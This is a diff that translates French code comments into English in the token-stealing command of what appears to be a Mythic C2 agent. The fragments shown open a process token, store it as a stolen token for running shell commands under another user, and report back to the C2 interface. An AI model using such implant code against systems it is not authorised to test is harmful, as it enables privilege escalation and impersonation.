@@ -10,8 +10,8 @@
 
 #ifdef INCLUDE_CMD_STEAL_TOKEN
 
-/* Active un privilège dans le token du processus courant.
- * Nécessaire même si le privilège est "présent" : Windows exige
+/* Enable a privilege in the current process token.
+ * Required even if the privilege is "present": Windows requires
  * une activation explicite via AdjustTokenPrivileges.
  * (This comment forces a re-build in Mythic) */
 
@@ -81,7 +81,7 @@ void command_steal_token(char *task_id, char *params) {
     return;
   }
 
-  /* Récupérer le token du processus */
+  /* Get the process token */
   HANDLE hToken = NULL;
   if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
     char err[64];
@@ -107,8 +107,8 @@ void command_steal_token(char *task_id, char *params) {
 
   CloseHandle(hToken);
 
-  /* Récupérer le nom d'utilisateur associé au token via LookupAccountSid
-   * (pas d'impersonation nécessaire, on interroge le token directement) */
+  /* Get the username associated with the token via LookupAccountSid
+   * (no impersonation needed, we query the token directly) */
   char username[256] = "unknown";
   DWORD needed = 0;
   GetTokenInformation(hPrimaryToken, TokenUser, NULL, 0, &needed);
@@ -123,17 +123,17 @@ void command_steal_token(char *task_id, char *params) {
   if (tu)
     free(tu);
 
-  /* Fermer l'ancien token volé s'il y en avait un */
+  /* Close the previous stolen token if any */
   if (g_stolen_token != NULL) {
     CloseHandle(g_stolen_token);
     RevertToSelf();
   }
 
-  /* Stocker le token primaire — execute_shell l'utilisera désormais via
+  /* Store the primary token - execute_shell will now use it via
    * CreateProcessWithTokenW */
   g_stolen_token = hPrimaryToken;
 
-  // Déclenchement immédiat du checkin pour mettre à jour l'UI Mythic
+  // Trigger immediate checkin to update Mythic UI
   char display_user[512] = {0};
   get_current_display_user(display_user, sizeof(display_user));
   CheckinSend(display_user);
